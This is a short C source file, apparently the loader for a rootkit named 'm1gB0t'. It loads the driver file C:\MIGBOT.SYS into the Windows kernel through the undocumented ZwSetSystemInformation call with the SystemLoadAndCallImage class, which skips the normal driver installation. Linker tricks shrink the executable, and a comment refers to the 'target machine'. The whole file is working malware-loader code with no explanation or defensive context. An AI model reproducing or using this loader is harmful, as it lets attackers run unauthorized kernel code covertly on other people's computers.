
//----------------------------------------------------------------
// m1gB0t, by Greg Hoglund, 2004
//----------------------------------------------------------------

//----------------------------------------------------------------
// optimizations to build smaller EXE
//----------------------------------------------------------------
#pragma comment(linker,"/ENTRY:main")
#pragma comment(linker,"/MERGE:.rdata=.data")
#pragma comment(linker,"/MERGE:.text=.data")

//adding this line makes the file a few K, but depends on
//and external MSVCRT.DLL, which is version dependant, not
//a good idea since the target machine might not have the
//right CRT on it.... (causes a nasty POPUP dialog, even)
//#pragma comment(lib,"msvcrt.lib")

//for VS.NET this is configured in the project settings, not here.
#if (_MSC_VER < 1300)
  #pragma comment(linker,"/IGNORE:4078")
  #pragma comment(linker,"/OPT:NOWIN98")
#endif

#define WIN32_LEAN_AND_MEAN

//----------------------------------------------------------------
// standard headers
//----------------------------------------------------------------
#include <windows.h> 
#include <stdio.h> 

//----------------------------------------------------------------
// stuff not found in header files
//----------------------------------------------------------------
typedef struct _UNICODE_STRING { 
    USHORT Length; 
    USHORT MaximumLength; 
#ifdef MIDL_PASS 
    [size_is(MaximumLength / 2), length_is((Length) / 2) ] USHORT * Buffer; 
#else // MIDL_PASS 
    PWSTR Buffer; 
#endif // MIDL_PASS 
} UNICODE_STRING, *PUNICODE_STRING; 

typedef long NTSTATUS; 

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0) 

typedef 
NTSTATUS 
(__stdcall *ZWSETSYSTEMINFORMATION)(
            DWORD SystemInformationClass, 
			PVOID SystemInformation, 
			ULONG SystemInformationLength
);

typedef 
VOID 
(__stdcall *RTLINITUNICODESTRING)(
	PUNICODE_STRING DestinationString, 
	PCWSTR SourceString   
);

ZWSETSYSTEMINFORMATION ZwSetSystemInformation;
RTLINITUNICODESTRING RtlInitUnicodeString;

typedef struct _SYSTEM_LOAD_AND_CALL_IMAGE 
{ 
 UNICODE_STRING ModuleName; 
} SYSTEM_LOAD_AND_CALL_IMAGE, *PSYSTEM_LOAD_AND_CALL_IMAGE; 

#define SystemLoadAndCallImage 38 

//----------------------------------------------------------------
// the rest of our program
//----------------------------------------------------------------
bool load_sysfile();

void main()
{

	if(!load_sysfile())
	{
		printf("Failed to load m1gB0t\r\n");
	}

}

//----------------------------------------------------------------
// load a sys file as a driver using undocumented method
//----------------------------------------------------------------
bool load_sysfile()
{
	SYSTEM_LOAD_AND_CALL_IMAGE GregsImage; 

	WCHAR daPath[] = L"\\??\\C:\\MIGBOT.SYS"; 

	////////////////////////////////////////////////////////////// 
	// get DLL entry points 
	////////////////////////////////////////////////////////////// 
	if(	!(RtlInitUnicodeString = (RTLINITUNICODESTRING) 
			GetProcAddress( GetModuleHandle("ntdll.dll")
			,"RtlInitUnicodeString" 
			))) 
	{
		return false;
	}

	if(!(ZwSetSystemInformation = (ZWSETSYSTEMINFORMATION)	
				GetProcAddress( 
					GetModuleHandle("ntdll.dll")
					,"ZwSetSystemInformation" )))
	{
		return false;
	}

	RtlInitUnicodeString( 
		&(GregsImage.ModuleName)
		,daPath 
	); 

	if(
		!NT_SUCCESS( 
			ZwSetSystemInformation( 
				SystemLoadAndCallImage	//defined on line 73
				,&GregsImage
				,sizeof(SYSTEM_LOAD_AND_CALL_IMAGE))))
	{ 
		return false;
	}

	return true;
}
